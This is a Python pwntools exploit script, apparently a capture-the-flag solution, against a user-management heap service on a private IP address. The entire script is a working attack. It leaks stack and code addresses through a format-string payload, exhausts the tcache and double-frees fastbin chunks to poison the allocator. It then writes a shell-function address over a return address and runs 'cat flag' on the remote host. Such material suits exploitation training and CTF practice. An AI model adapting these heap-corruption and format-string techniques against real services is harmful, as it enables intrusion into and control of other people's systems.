from pwn import *
import struct


#function 1 to delete user/free a chunk
def remove_user(connection: remote, user_index: int):
    if not isinstance(connection, remote):
        raise TypeError("Expected a 'remote' instance for 'connection'")
    if not isinstance(user_index, int):
        raise TypeError("Expected an 'int' for 'user_index'")
    connection.sendline(b"d")
    connection.sendline(str(user_index).encode())

#function 2 to create a new user/ malloc a chunk
def add_user(connection: remote, username: bytes):
    if not isinstance(connection, remote):
        raise TypeError("Expected a 'remote' instance for 'connection'")
    if not isinstance(username, bytes):
        raise TypeError("Expected a 'bytes' for 'username'")
    connection.sendline(b"g")
    connection.sendline(username)

#start establishing connection with the remote server
try:
    connection = remote('10.21.232.3', 10101)

    connection.recvuntil(b'name? ') #receive until the string mentioned
    connection.sendline(b'%6$p.%11$p') #leak stack address using format string
    addresses = connection.recvuntil(b'!').decode().split('.')
    return_addr = int(addresses[0][3:], 16)
    shell_addr = int(addresses[1][:-1], 16)

    #offsets added to resolve address
    return_addr += 0x8 
    shell_addr -= 0x15c

    
    connection.recvuntil(b'Action: ')
    for _ in range(9): #allocating 9 same sized malloc chunks
        add_user(connection, b"sses")

    for i in range(7): #then free 7 of the malloc chunks
        remove_user(connection, i)

    remove_user(connection, 7)
    remove_user(connection, 8)
    remove_user(connection, 7) #double freed the bins
    #to create a circular linked list between 2 of the fastbins

    for _ in range(7): #re-allocating the 7 of the tcache bins again
        add_user(connection, b"abcd")


    add_user(connection, struct.pack("<Q", return_addr)) #immediate next bin re-allocated with the target address 
    add_user(connection, b"CCCV")
    add_user(connection, b"5432") #dummy allocations to reach target address to insert shell payload
    add_user(connection, struct.pack("<Q", shell_addr)) #malloc with address written in the target address above
    connection.sendline(b"cat flag") #this command is executed on the remote server retrieving the flag
    print(connection.recvallS())
finally:
    connection.close()
